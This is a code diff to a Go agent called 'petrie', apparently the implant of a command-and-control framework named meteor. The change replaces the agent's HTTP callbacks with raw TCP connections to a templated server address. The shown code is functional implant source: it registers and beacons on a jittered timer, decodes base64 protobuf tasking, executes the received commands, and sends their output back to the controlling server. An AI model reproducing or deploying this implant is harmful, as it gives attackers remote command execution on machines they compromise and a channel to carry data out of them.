+++ meteor/agents/petrie/petrie.go
@@ -1,19 +1,20 @@
 package main
 
 import (
-	"bytes"
+	"bufio"
+	"encoding/base64"
 	"fmt"
-	cUtils "github.com/degenerat3/meteor/meteor/clients/utils"
+	agentUtils "github.com/degenerat3/meteor/meteor/agents/utils"
 	"github.com/degenerat3/meteor/meteor/pbuf"
 	"github.com/golang/protobuf/proto"
-	"io/ioutil"
 	"math/rand"
-	"net/http"
+	"net"
 	"os"
+	"strings"
 	"time"
 )
 
-// SERVER is the IP/port of the web server to connect to (ex: `192.168.1.2:1234`)
+// SERVER is the IP/port of the TCP server to connect to (ex: `192.168.1.2:1234`)
 var SERVER = "$$SERVER$$"
 
 // INTERVAL is how long to sleep between callbacks
@@ -39,31 +40,50 @@ func main() {
 		os.Exit(0)
 	}
 	for {
-		var payload []byte
-		regstat := cUtils.CheckRegStatus(REGFILE)
+		var payload string
+		regstat := agentUtils.CheckRegStatus(REGFILE)
 		if DEBUG {
 			fmt.Printf("RegStat: %t\n", regstat)
 		}
 		if regstat {
-			payload = cUtils.GenCheckinRaw(REGFILE, OBFTEXT)
+			payload = agentUtils.GenCheckin(REGFILE, OBFTEXT)
 		} else {
-			payload = cUtils.GenRegisterRaw(INTERVAL, DELTA, REGFILE, OBFTEXT)
+			payload = agentUtils.GenRegister(INTERVAL, DELTA, REGFILE, OBFTEXT)
 		}
 		if DEBUG {
 			fmt.Printf("Payload: %s\n", payload)
 		}
-
-		if DEBUG {
-			fmt.Printf("Sending payload over web req...\n")
+		conn, err := net.Dial("tcp", SERVER)
+		if err != nil {
+			if DEBUG {
+				fmt.Printf("Error connecting to server: %s\n", err.Error())
+			}
+			endCheck()
+			continue
 		}
-		respData := sendWebReq(SERVER, payload)
-
 		if DEBUG {
-			fmt.Printf("Got response: %s\n", respData)
+			fmt.Printf("Writing payload to conn...\n")
 		}
-
+		fmt.Fprintf(conn, "%s\n", payload)
+		if DEBUG {
+			fmt.Printf("Reading data from conn...\n")
+		}
+		data, _ := bufio.NewReader(conn).ReadString('\n')
+		conn.Close()
+		data = strings.TrimSuffix(data, "\n")
+		if DEBUG {
+			fmt.Printf("Got response: %s\n", data)
+		}
+		decoded, err := base64.StdEncoding.DecodeString(data)
+		if DEBUG {
+			if err != nil {
+				fmt.Println("Error decoding response: " + err.Error())
+				endCheck()
+			}
+			fmt.Printf("Decoded: %s\n", decoded)
+		}
 		resp := &mcs.MCS{}
-		err := proto.Unmarshal(respData, resp)
+		err = proto.Unmarshal(decoded, resp)
 		if err != nil {
 			if DEBUG {
 				fmt.Printf("Error unmarshalling data: %s\n", err.Error())
@@ -87,14 +107,22 @@ func main() {
 			}
 			mod := acn.GetMode()
 			args := acn.GetArgs()
-			acnOut := cUtils.ExecCommand(mod, args)
-			acnData := cUtils.GenAddResultRaw(uid, acnOut)
+			acnOut := agentUtils.ExecCommand(mod, args)
+			acnData := agentUtils.GenAddResult(uid, acnOut)
+			conn, err = net.Dial("tcp", SERVER)
 			if DEBUG {
-				fmt.Printf("Sending action result over request...\n")
+				fmt.Printf("Writing response data...\n")
 			}
-			sendWebReq(SERVER, acnData)
+			fmt.Fprintf(conn, "%s\n", acnData)
+			if DEBUG {
+				fmt.Printf("Reading response ack...\n")
+			}
+			data, _ = bufio.NewReader(conn).ReadString('\n')
+			data = strings.TrimSuffix(data, "\n") // read the ack, even though we don't do anything with it rn
+			conn.Close()
 		}
 		endCheck()
+		conn.Close()
 
 	}
 }
@@ -113,21 +141,4 @@ func endCheck() {
 		fmt.Printf("Sleeping for %d seconds...\n", sleeptime)
 	}
 	time.Sleep(time.Duration(sleeptime) * time.Second)
-}
-
-func sendWebReq(server string, payload []byte) []byte {
-	url := "http://" + server + "/lf"
-	errDat := &mcs.MCS{
-		Status: 500,
-	}
-	errProto, _ := proto.Marshal(errDat)
-	resp, err := http.Post(url, "", bytes.NewBuffer(payload))
-	if err != nil {
-		return errProto
-	}
-	data, err := ioutil.ReadAll(resp.Body)
-	if err != nil {
-		return errProto
-	}
-	return data
 }
